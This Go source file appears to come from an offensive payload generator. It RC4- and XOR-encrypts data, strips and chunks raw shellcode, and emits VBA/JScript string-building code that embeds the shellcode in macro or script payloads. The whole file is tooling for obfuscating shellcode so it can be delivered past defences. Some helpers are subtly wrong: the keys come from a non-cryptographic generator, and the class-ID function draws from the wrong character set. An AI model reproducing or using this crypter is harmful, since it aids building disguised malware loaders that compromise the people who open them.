package Cryptor

import (
	"crypto/rc4"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strings"
	"time"

	xor "github.com/KyleBanks/XOREncryption/Go"
)

type args struct {
	Key        string
	Ciphertext string
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
const numbers = "1234567890"
const capital = "ABCDEF"

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}

func Rc4_encryptor(text string) (string, string) {
	plaintext := []byte(text)
	key, _ := generateRandomBytes(32)
	block, _ := rc4.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	block.XORKeyStream(ciphertext, plaintext)

	b64ciphertext := base64.StdEncoding.EncodeToString(ciphertext)
	b64key := base64.StdEncoding.EncodeToString(key)
	return b64ciphertext, b64key

}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]

	}
	return string(b)
}

func randclassid() string {
	nn := 7
	f := make([]byte, nn)
	e := make([]byte, nn)
	for i := range f {
		f[i] = letters[rand.Intn(len(numbers))]
	}
	for i := range e {
		e[i] = letters[rand.Intn(len(capital))]

	}
	b := string(f) + "-0000-0000-0000-0000" + string(e)
	return string(b)
}

func VarNumberLength(min, max int) string {
	time.Sleep(2 * time.Millisecond)
	var r string
	rand.Seed(time.Now().UnixNano())
	num := rand.Intn(max-min) + min
	n := num
	r = RandStringBytes(n)
	return r
}

func StagelessArrayGen(data []byte) string {
	var fmtStr string
	aSlice := data
	fmtStr = strings.Repeat("%d, ", len(aSlice)-1)
	fmtStr += "%d"
	var slice []interface{} = make([]interface{}, len(aSlice))
	for f := range aSlice {
		slice[f] = int8(aSlice[f])
	}
	retStr := fmt.Sprintf(fmtStr, slice...)
	return retStr
}

func ShellCodePayload(shellcode string, EncodedPayload string, opt bool, jscriptshellcode string) string {
	var scpayload []string
	if strings.Contains(string(shellcode), "=") {
		shellcodetemp := strings.Split(string(shellcode), "=")
		shellcode = string(shellcodetemp[1])
	}
	if strings.Contains(string(shellcode), "\"") {
		shellcode = strings.Replace(shellcode, "\"", "", -1)
	}
	if strings.Contains(string(shellcode), ";") {
		shellcode = strings.Replace(string(shellcode), ";", "", -1)
	}
	if strings.Contains(string(shellcode), "\\x") {
		shellcode = strings.Replace(string(shellcode), "\\x", "", -1)
	}
	if strings.Contains(string(shellcode), " ") {
		shellcode = strings.Replace(string(shellcode), " ", "", -1)
	}
	if strings.Contains(string(shellcode), "\n") {
		shellcode = strings.Replace(string(shellcode), "\n", "", -1)
	}
	const MAX_LENGTH int = 850
	x := 0
	shellcodeLength := len(shellcode)
	scpayload = append(scpayload, fmt.Sprintf("\r"))
	for x < shellcodeLength {
		if opt == true {

			if x+MAX_LENGTH <= shellcodeLength {
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", shellcode[0+x:x+MAX_LENGTH]))
				x += MAX_LENGTH
			} else {
				finalLength := shellcodeLength - x
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", shellcode[0+x:x+finalLength]))
				x += finalLength
			}
		} else if opt == false {
			if x+MAX_LENGTH <= shellcodeLength {
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", shellcode[0+x:x+MAX_LENGTH]))
				x += MAX_LENGTH
			} else {
				finalLength := shellcodeLength - x
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", shellcode[0+x:x+finalLength]))
				x += finalLength
			}
		}
	}
	shellpayload := strings.Join(scpayload, "")
	return shellpayload
}

func VbaCodePayload(vbacode string, EncodedPayload string, opt bool, jscriptshellcode string) string {
	var scpayload []string
	if opt == true {
		const MAX_LENGTH int = 850
		x := 0
		shellcodeLength := len(vbacode)
		scpayload = append(scpayload, fmt.Sprintf("\r"))
		for x < shellcodeLength {
			if x+MAX_LENGTH <= shellcodeLength {
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", vbacode[0+x:x+MAX_LENGTH]))
				x += MAX_LENGTH
			} else {
				finalLength := shellcodeLength - x
				scpayload = append(scpayload, fmt.Sprintf(EncodedPayload+" = "+EncodedPayload+" & \"%s\"\n", vbacode[0+x:x+finalLength]))
				x += finalLength
			}
		}

		vbacode = strings.Join(scpayload, "")
	}
	if strings.Contains(string(vbacode), "myArray = ") {
		vbacode = strings.Replace(string(vbacode), "myArray = ", "", -1)
	}
	return vbacode
}

func Encrypt(data string, key string, shellcode string, EncodedPayload string) string {
	var rawpayload []string
	input := []byte(xor.EncryptDecrypt(data, key))
	rawr := hex.EncodeToString(input)
	const MAX_LENGTH int = 950
	x := 0
	rawrLength := len(rawr)
	rawpayload = append(rawpayload, fmt.Sprintf("\r"))
	rawpayload = append(rawpayload, fmt.Sprintf("	"+shellcode+" += 'Sub init()\\n';\n"))
	for x < rawrLength {
		if x+MAX_LENGTH <= rawrLength {
			rawpayload = append(rawpayload, fmt.Sprintf("	"+shellcode+" += '"+EncodedPayload+" = "+EncodedPayload+" & \"%s\"\\n';\n", rawr[0+x:x+MAX_LENGTH]))
			x += MAX_LENGTH
		} else {
			finalLength := rawrLength - x
			rawpayload = append(rawpayload, fmt.Sprintf("	"+shellcode+" += '"+EncodedPayload+" = "+EncodedPayload+" & \"%s\"\\n';\n", rawr[0+x:x+finalLength]))
			x += finalLength
		}
	}
	rawpayload = append(rawpayload, fmt.Sprintf("	"+shellcode+" += 'End Sub\\n';\n"))
	payload := strings.Join(rawpayload, "")
	return payload
}
